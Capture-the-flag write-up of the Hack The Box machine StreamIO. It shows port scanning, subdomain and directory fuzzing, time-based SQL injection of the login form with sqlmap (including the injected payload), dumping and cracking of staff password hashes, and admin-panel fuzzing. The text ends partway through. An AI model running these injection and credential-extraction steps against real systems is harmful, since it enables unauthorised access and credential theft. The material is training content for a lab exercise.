---
title: "HTB Writeup: StreamIO [Medium]"
summary: "A medium rated Windows box, with some Web vulnerabilities and domain privilege escaltion using Bloodhound."
tags: ["htb", "writeup", "medium"]
#externalUrl: ""
showSummary: true
date: 2023-01-19
draft: false
---

# StreamIO

### Enumeration
#### nmap
```nmap``` scans multiple open ports, indicating that we indeed have to deal with a ```Windows``` machine. Open port 53 hints that it's also likely to be a domain controller.
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sudo nmap -A -T4 -sC -sV 10.10.11.158 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 21:35 CEST
Nmap scan report for 10.10.11.158
Host is up (0.023s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-27 00:33:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-06-27T00:34:19+00:00; +4h57m32s from scanner time.
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-06-27T00:33:42
|_  start_date: N/A
|_clock-skew: mean: 4h57m31s, deviation: 0s, median: 4h57m31s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   26.88 ms 10.10.14.1
2   27.22 ms 10.10.11.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.65 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -p- 10.10.11.158 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 21:36 CEST
Nmap scan report for 10.10.11.158
Host is up (0.024s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-27 00:35:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-06-27T00:38:28+00:00; +4h57m32s from scanner time.
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h57m31s, deviation: 0s, median: 4h57m31s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-27T00:37:50
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   27.98 ms 10.10.14.1
2   28.03 ms 10.10.11.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 277.06 seconds
```
#### DNS

The ```nmap``` output tells us that the domain is called ```streamIO.htb``` and the server is likely a ```Domain Controller```.
So I've added an entry to my ```/etc/hosts```

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                           
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.158    streamio.htb
```

#### Kerberos

We can confirm interaction with ```kerberos``` by enumerating user accounts with nmap scripts:

```
┌──(kali㉿kali)-[~]
└─$ nmap  -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=streamio.htb,userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 10.10.11.158          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 21:49 CEST
Nmap scan report for streamio.htb (10.10.11.158)
Host is up (0.025s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    administrator@streamio.htb

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```


#### HTTP Port 80

Directory bruteforcing and subdomain enumeration with ```gobuster``` and ```ffuf``` was unsuccessful.

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.streamio.htb" -u http://streamio.htb/  -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://streamio.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.streamio.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 1364 req/sec :: Duration: [0:01:33] :: Errors: 0 ::
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://streamio.htb -e -s 200 -no-status
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/06/26 21:43:05 Starting gobuster in directory enumeration mode
===============================================================
http://streamio.htb/*checkout*           [Size: 3420]
http://streamio.htb/*docroot*            [Size: 3420]
http://streamio.htb/*                    [Size: 3420]
http://streamio.htb/http%3a%2f%2fwww     [Size: 3420]
http://streamio.htb/http%3a              [Size: 3420]
http://streamio.htb/q%26a                [Size: 3420]
http://streamio.htb/**http%3a            [Size: 3420]
http://streamio.htb/*http%3a             [Size: 3420]
http://streamio.htb/http%3a%2f%2fyoutube [Size: 3420]
http://streamio.htb/http%3a%2f%2fblogs   [Size: 3420]
http://streamio.htb/http%3a%2f%2fblog    [Size: 3420]
http://streamio.htb/**http%3a%2f%2fwww   [Size: 3420]
http://streamio.htb/s%26p                [Size: 3420]
http://streamio.htb/%3frid%3d2671        [Size: 3420]
http://streamio.htb/devinmoore*          [Size: 3420]
http://streamio.htb/200109*              [Size: 3420]
http://streamio.htb/*dc_                 [Size: 3420]
http://streamio.htb/*sa_                 [Size: 3420]
http://streamio.htb/http%3a%2f%2fcommunity [Size: 3420]
http://streamio.htb/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct [Size: 3420]
http://streamio.htb/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29 [Size: 3420]
http://streamio.htb/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt [Size: 3420]                   
http://streamio.htb/http%3a%2f%2fradar   [Size: 3420]                                                           
http://streamio.htb/q%26a2               [Size: 3420]                                                           
http://streamio.htb/login%3f             [Size: 3420]                                                           
http://streamio.htb/shakira%20oral%20fixation%201%20%26%202 [Size: 3420]                                        
http://streamio.htb/http%3a%2f%2fjeremiahgrossman [Size: 3420]                                                  
http://streamio.htb/http%3a%2f%2fweblog  [Size: 3420]                                                           
http://streamio.htb/http%3a%2f%2fswik    [Size: 3420]                                                           
                                                                                                                
===============================================================
2022/06/26 21:54:03 Finished
===============================================================
```

#### HTTPS Port 443

```gobuster``` was unable to scan because the certificate was invalid, so i've added the ```-k``` flag so that the program will ignore any certficate related issues.

> Error: error on running gobuster: unable to connect to https://streamio.htb/: invalid certificate: x509: certificate has expired or is not yet valid: current time 2022-06-26T21:58:43+02:00 is after 2022-03-24T07:03:28Z

Enmueration with ```ffuf``` and ```gobuster``` both was succesfull:
```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.streamio.htb" -u https://streamio.htb/  -fs 703

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.streamio.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 556ms]
:: Progress: [114441/114441] :: Job [1/1] :: 275 req/sec :: Duration: [0:10:17] :: Errors: 0 ::
```

I've  added the new subdomain ```watch.streamio.htb``` to my /etc/hosts

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                         
127.0.0.1       localhost
127.0.1.1       kali
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.158    streamio.htb watch.streamio.htb
```
### gobuster
```gobuster``` found multiple URLs, most interesting is https://streamio.htb/admin it just displays ```FORBIDDEN``` in a HTML header instead of a typical ```403 HTTP IIS Error```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -k -u https://streamio.htb -e -s 200 -no-status
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/06/26 21:58:52 Starting gobuster in directory enumeration mode
===============================================================
https://streamio.htb/images               [Size: 151] [--> https://streamio.htb/images/]
https://streamio.htb/admin                [Size: 150] [--> https://streamio.htb/admin/] 
https://streamio.htb/css                  [Size: 148] [--> https://streamio.htb/css/]   
https://streamio.htb/js                   [Size: 147] [--> https://streamio.htb/js/]    
https://streamio.htb/fonts                [Size: 150] [--> https://streamio.htb/fonts/] 
https://streamio.htb/*checkout*           [Size: 3420]                                  
https://streamio.htb/*docroot*            [Size: 3420]                                  
https://streamio.htb/*                    [Size: 3420]                                  
https://streamio.htb/http%3a%2f%2fwww     [Size: 3420]                                  
https://streamio.htb/http%3a              [Size: 3420]                                  
https://streamio.htb/q%26a                [Size: 3420]                                  
https://streamio.htb/**http%3a            [Size: 3420]                                  
https://streamio.htb/*http%3a             [Size: 3420]                                  
https://streamio.htb/http%3a%2f%2fyoutube [Size: 3420]                                  
https://streamio.htb/http%3a%2f%2fblogs   [Size: 3420]                                  
https://streamio.htb/http%3a%2f%2fblog    [Size: 3420]                                  
https://streamio.htb/**http%3a%2f%2fwww   [Size: 3420]                                  
https://streamio.htb/s%26p                [Size: 3420]                                  
https://streamio.htb/%3frid%3d2671        [Size: 3420]                                  
https://streamio.htb/devinmoore*          [Size: 3420]                                  
https://streamio.htb/200109*              [Size: 3420]                                  
https://streamio.htb/*sa_                 [Size: 3420]                                  
https://streamio.htb/*dc_                 [Size: 3420]                                  
https://streamio.htb/http%3a%2f%2fcommunity [Size: 3420]                                
https://streamio.htb/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct [Size: 3420]
https://streamio.htb/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29 [Size: 3420]
https://streamio.htb/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt [Size: 3420]                   
https://streamio.htb/http%3a%2f%2fradar   [Size: 3420]                                                           
https://streamio.htb/q%26a2               [Size: 3420]                                                           
https://streamio.htb/login%3f             [Size: 3420]                                                           
https://streamio.htb/shakira%20oral%20fixation%201%20%26%202 [Size: 3420]                                        
https://streamio.htb/http%3a%2f%2fjeremiahgrossman [Size: 3420]                                                  
https://streamio.htb/http%3a%2f%2fweblog  [Size: 3420]                                                           
https://streamio.htb/http%3a%2f%2fswik    [Size: 3420]                                                           
                                                                                                                 
===============================================================
2022/06/26 22:14:36 Finished
===============================================================
```

I've continued to directoy bruteforce https://streamio.htb/admin/ with gobuster, but it did not reveal any interesting subdirectorys.

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://watch.streamio.htb/ -e -s 200 -no-status -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] No status:               true
[+] Timeout:                 10s
===============================================================
2022/06/26 22:27:45 Starting gobuster in directory enumeration mode
===============================================================
https://watch.streamio.htb/static               [Size: 157] [--> https://watch.streamio.htb/static/]
https://watch.streamio.htb/*checkout*           [Size: 3420]                                        
https://watch.streamio.htb/*docroot*            [Size: 3420]                                        
https://watch.streamio.htb/*                    [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fwww     [Size: 3420]                                        
https://watch.streamio.htb/http%3a              [Size: 3420]                                        
https://watch.streamio.htb/q%26a                [Size: 3420]                                        
https://watch.streamio.htb/**http%3a            [Size: 3420]                                        
https://watch.streamio.htb/*http%3a             [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fyoutube [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fblogs   [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fblog    [Size: 3420]                                        
https://watch.streamio.htb/**http%3a%2f%2fwww   [Size: 3420]                                        
https://watch.streamio.htb/s%26p                [Size: 3420]                                        
https://watch.streamio.htb/%3frid%3d2671        [Size: 3420]                                        
https://watch.streamio.htb/devinmoore*          [Size: 3420]                                        
https://watch.streamio.htb/200109*              [Size: 3420]                                        
https://watch.streamio.htb/*sa_                 [Size: 3420]                                        
https://watch.streamio.htb/*dc_                 [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fcommunity [Size: 3420]                                      
https://watch.streamio.htb/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29 [Size: 3420]
https://watch.streamio.htb/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct [Size: 3420]                
https://watch.streamio.htb/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt [Size: 3420]                   
https://watch.streamio.htb/http%3a%2f%2fradar   [Size: 3420]                                                           
https://watch.streamio.htb/q%26a2               [Size: 3420]                                                           
https://watch.streamio.htb/login%3f             [Size: 3420]                                                           
https://watch.streamio.htb/shakira%20oral%20fixation%201%20%26%202 [Size: 3420]                                        
https://watch.streamio.htb/http%3a%2f%2fjeremiahgrossman [Size: 3420]                                                  
https://watch.streamio.htb/http%3a%2f%2fweblog  [Size: 3420]                                                           
https://watch.streamio.htb/http%3a%2f%2fswik    [Size: 3420]                                                           
                                                                                                                       
===============================================================
2022/06/26 22:38:59 Finished
===============================================================
```

## Foothold
### SQLi
By manually enumerating the webpages i've found a login form at https://streamio.htb/login.php

Let's intercept a login request and push it into ```sqlmap```.
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ cat request.sql           
POST /login.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=s1idgcea6he98h4v5hrsg97mhs
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://streamio.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://streamio.htb/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=yeeb&password=yeeb
```

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl
        ___
       __H__                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.6.6#stable}                                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:42:30 /2022-06-26/

[22:42:30] [INFO] parsing HTTP request from 'request.sql'

[...]

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=yeeb';WAITFOR DELAY '0:0:5'--&password=yeeb

```

Injection commands and findings:

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl
```

```
[22:48:26] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
```
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO
```

```
[23:01:05] [INFO] retrieved: dbo.users
```

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users
```

```
[23:05:05] [INFO] adjusting time delay to 1 second due to good response times
id
[23:05:13] [INFO] retrieved: is_staff
[23:05:54] [INFO] retrieved: password
[23:06:36] [INFO] retrieved: username

[...]
[23:07:29] [INFO] retrieved: 1
[23:07:33] [INFO] retrieved: c660060492d9edcaa8332^C
[23:09:03] [WARNING] Ctrl+C detected in dumping phase                                                                                                      
Database: StreamIO
Table: users
[1 entry]
+----+----------+
| id | is_staff |
+----+----------+
| 3  | 1        |
+----+----------+

```

Okay, there are ```30``` user entrys in the DB lets narrow it down to just users, that have the ```is_staff``` flag set.
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users -C is_staff,username,password --where "is_staff=1"
```

I've had some issues so i've added, as adviced by ```sqlmap```, the ```--force-pivoting``` flag.

```
[23:10:44] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
[23:10:44] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                    

[23:10:49] [INFO] retrieved: 
[23:10:50] [INFO] retrieved: 
[23:10:50] [INFO] retrieved: 
[23:10:51] [INFO] retrieved: 
[23:10:51] [INFO] retrieved: 
[23:10:52] [INFO] retrieved: 
[23:10:53] [INFO] retrieved: 
[23:11:07] [WARNING] Ctrl+C detected in dumping phase                                                                                                      
Database: StreamIO
Table: users
[11 entries]
+----------+----------+----------+
| is_staff | username | password |
+----------+----------+----------+
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
| <blank>  | <blank>  | <blank>  |
+----------+----------+----------+

```

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users -C is_staff,username,password --where "is_staff=1" --force-pivoting
```

The output was a bit mangled and eventually stopped. So i did some research and it seemed like the auto pivoting messed up some things. So I've set a fixed column for pivoting.

```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users -C id,is_staff,username,password --where "is_staff=1" --force-pivoting -pivot-column id 
```

Okay that now seems to kinda work, but still takes super long. Lets start off by just getting ```Users``` and ```IDs``` to shorten the response times.

```
[23:22:31] [INFO] retrieved: 1
[23:22:35] [INFO] retrieved: 3577c47eb1e12c8ba021611e1280753c                  
[23:27:07] [INFO] retrieved: Thane                                             
[23:33:12] [INFO] retrieved: 11
[23:33:19] [INFO] retrieved: 1
[23:33:23] [INFO] retrieved: 35394484d89fcfdb3c5e447fe749d213                  
[23:38:18] [INFO] retrieved: Carmon                                            
[23:44:17] [INFO] retrieved: 12
[23:44:24] [INFO] retrieved: 1
[23:44:28] [INFO] retrieved: 54c88b2dbd7b1a84012fabc1a4c73415                  
[23:49:03] [INFO] retrieved: Barry                                             
[23:55:03] [INFO] retrieved: 13
[23:55:12] [INFO] retrieved: 1
[23:55:15] [INFO] retrieved: fd78^C
[23:55:37] [WARNING] user aborted during enumeration. sqlmap will display partial output
Database: StreamIO
Table: users
[3 entries]
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | username                                           | password                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 10 | 1        | Thane                                              | 3577c47eb1e12c8ba021611e1280753c                   |
| 11 | 1        | Carmon                                             | 35394484d89fcfdb3c5e447fe749d213                   |
| 12 | 1        | Barry                                              | 54c88b2dbd7b1a84012fabc1a4c73415                   |
+----+----------+----------------------------------------------------+----------------------------------------------------+
```


```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users -C id,username --where "is_staff=1" --force-pivoting -pivot-column id 
```
```
Database: StreamIO
Table: users
[29 entries]
+----+----------------------------------------------------+
| id | username                                           |
+----+----------------------------------------------------+
| 10 | Thane                                              |
| 11 | Carmon                                             |
| 12 | Barry                                              |
| 13 | Oliver                                             |
| 14 | Michelle                                           |
| 15 | Gloria                                             |
| 16 | Victoria                                           |
| 17 | Alexendra                                          |
| 18 | Baxter                                             |
| 19 | Clara                                              |
| 20 | Barbra                                             |
| 21 | Lenord                                             |
| 22 | Austin                                             |
| 23 | Garfield                                           |
| 24 | Juliette                                           |
| 25 | Victor                                             |
| 26 | Lucifer                                            |
| 27 | Bruno                                              |
| 28 | Diablo                                             |
| 29 | Robin                                              |
| 3  | James                                              |
| 30 | Stan                                               |
| 31 | yoshihide                                          |
| 4  | Theodore                                           |
| 5  | Samantha                                           |
| 6  | Lauren                                             |
| 7  | William                                            |
| 8  | Sabrina                                            |
| 9  | Robert                                             |
+----+----------------------------------------------------+
````
Okay the username ```yoshihide``` seems off, lets query the database for that user.
```
┌──(kali㉿kali)-[~/htb/streamio]
└─$ sqlmap -r request.sql  --dbs --dump --force-ssl -D StreamIO -T users -C id,is_staff,username,password --where "id=31" --force-pivoting -pivot-column id 
```
```
[00:27:14] [INFO] retrieved: b77
[00:27:30] [ERROR] invalid character detected. retrying..
[00:27:30] [WARNING] increasing time delay to 2 seconds
9ba15cedfd22a023c4d8bcf5f2332  
[00:31:38] [ERROR] invalid character detected. retrying..
[00:31:38] [WARNING] increasing time delay to 3 seconds
```
Throwing the hash into crackstation reveals the following password.

|Username| MD5 | Cracked  |
|---|---|---|
|yoshihide| b779ba15cedfd22a023c4d8bcf5f2332  |  66boysandgirls.\. |

Login at the login form is successful.

## Admin Panel
We can now access https://streamio.htb/admin
Which has four functions:
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=

### Fuzzing
Since i got nowhere with these functions i fuzzed for php files in that directory and found ```master.php``` which states:

> Movie managment
> Only accessable through ```includes```

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u https://streamio.htb/admin/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 48ms]
# directory-list-lowercase-2.3-small.txt [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 54ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 28ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 27ms]
# on at least 3 different hosts [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 27ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 29ms]
#                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 29ms]
# Priority-ordered case-insensitive list, where entries were found [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 35ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 33ms]
#                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 37ms]
